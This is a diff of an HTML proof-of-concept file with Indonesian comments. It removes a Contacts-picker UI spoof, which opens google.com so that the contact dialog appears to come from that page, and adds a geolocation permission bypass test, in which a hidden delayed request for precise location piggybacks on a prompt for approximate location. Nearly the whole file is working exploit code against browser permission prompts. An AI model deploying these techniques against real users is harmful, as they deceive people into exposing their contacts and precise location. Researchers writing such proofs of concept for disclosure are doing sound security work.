@@ -1,33 +1,30 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <title>Contacts UI Spoof PoC</title>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1">
-    <script>
-    onclick = async () => {
-        // Buka tab baru terlebih dahulu, membuat pengguna mengira Contacts berasal dari tab baru
-        const newWin = open("https://www.google.com", "PoC", "_blank");
-        
-        // Kemudian segera panggil Contacts picker
-        // Pada versi yang rentan, dialog Contacts tidak akan ditutup meskipun tab asli kehilangan fokus
-        try {
-            const contacts = await navigator.contacts.select(["name", "tel"], { multiple: true });
-            if (contacts.length > 0) {
-                document.body.innerHTML = `
-                    <h1 style="color:red">Leaked: ${contacts.map(c => c.name).join(", ")}</h1>
-                `;
-            }
-        } catch(e) {
-            console.log("Picker gagal:", e.message);
-        }
-    }
-    </script>
-</head>
+<html>
+<head><meta charset="UTF-8"><title>Geo Permission Bypass Test</title></head>
 <body>
-    <br><br><br>
-    <center>
-        <h1>Klik di mana saja: Dialog Contacts akan melayang di atas halaman google.com</h1>
-    </center>
+<button id="btn">Mulai Pengujian</button>
+<script>
+document.getElementById('btn').addEventListener('click', async () => {
+    // Buka window kedua, meminta lokasi perkiraan
+    const winB = window.open('', 'B', 'width=300,height=200');
+    winB.document.body.innerHTML = '<h1>Meminta lokasi perkiraan...</h1>';
+    winB.navigator.geolocation.getCurrentPosition(
+        () => console.log('B: perkiraan berhasil'),
+        (e) => console.log('B:', e.message),
+        { enableHighAccuracy: false }  // perkiraan
+    );
+    
+    // Window asli secara tersembunyi menanam permintaan presisi (ditunda)
+    setTimeout(() => {
+        navigator.geolocation.getCurrentPosition(
+            (pos) => {
+                document.body.innerHTML = `<h1 style="color:red">Kebocoran presisi: ${pos.coords.latitude}, ${pos.coords.longitude}</h1>`;
+            },
+            (e) => console.log('A:', e.message),
+            { enableHighAccuracy: true }  // presisi
+        );
+    }, 500);
+});
+</script>
 </body>
 </html>
